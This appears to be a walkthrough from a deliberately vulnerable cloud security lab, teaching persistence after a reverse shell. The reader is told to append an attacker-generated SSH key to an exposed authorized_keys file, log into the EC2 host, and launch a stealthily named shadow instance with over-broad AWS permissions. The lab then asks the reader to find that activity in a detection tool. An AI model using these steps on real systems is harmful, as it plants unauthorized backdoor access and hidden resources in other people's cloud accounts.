# 🔥 Vulnerable Labs: Persistence Pays Off!
*A deliberately insecure application for security education and demos*

---

## 💀 About the Challenge

In this exercise you'll learn how to leverage excessive permissions and misconfigurations to gain persistence in a cloud environment.

Mitre ATT&CK defines persistence as techniques to allow adversaries to maintain their access to systems and devices across restarts and other interruptions. 


### 🎯 Your Mission

1. Ensure your reverse shell is still active. You can re-run the reverse shell commands from [2-Reverse-Shell.md](2-Reverse-Shell.md) if needed.
2. On your laptop, open a terminal and run the following command to generate a new SSH keypair:
```bash
ssh-keygen -t rsa -f attacker_key
```
3. Run the following command to obtain the attacker_key public key.
```bash
cat attacker_key.pub
```
4. Using the reverse shell terminal, run the following commands What do you see? - A read/write mapped drive that includes the ssh folder containing the authorized_keys file.
```bash
ls /flappy
ls -alh /flappy/mapped_drive
ls -alh /flappy/mapped_drive/.ssh
cat /flappy/mapped_drive/.ssh/authorized_keys
``` 
5. Run the command using the output from step 3 to add your newly generated public key to the authorized key file on the .
```bash
echo "public key from Step 3" >> /flappy/mapped_drive/.ssh/authorized_keys
```
6. Run the command to get the IP address of the WebServer EC2 instance (this should match the Public IP in the AWS console):
```bash
curl ipconfig.io
```
7. SSH to the EC2 instance directly:
```bash
ssh -i attacker_key ubuntu@ip_address
```
At this point we've gained persistence to the underlying EC2 host. But what if the host is shut down or terminated? Let's now spin up a shadow EC2 instance using excessive AWS permissions.

8. Run the following commands to install jq and the AWS CLI:
```bash
apt update && apt install jq curl
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip" && unzip awscliv2.zip && ./aws/install && aws sts get-caller-identity
```

8. Run the following command to launch a new shadow EC2 instance:
```bash
aws ec2 run-instances \
    --instance-type t2.micro \
    --image-id ami-0aa2b7722dc1b5612 \
    --subnet-id $(aws ec2 describe-subnets --query "Subnets[?MapPublicIpOnLaunch].SubnetId | [0]" --output text) \
    --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=NothingToSeeHere}]' \
    --associate-public-ip-address
```


Congratulations, you've completed this challenge. Can you now find the command you executed in Wiz? How long did it take to appear in the console?

### 💥 Hints & Tips

Note: Don't forget to substitute:
- ip_address in Step 7 for the IP address output from Step 6.
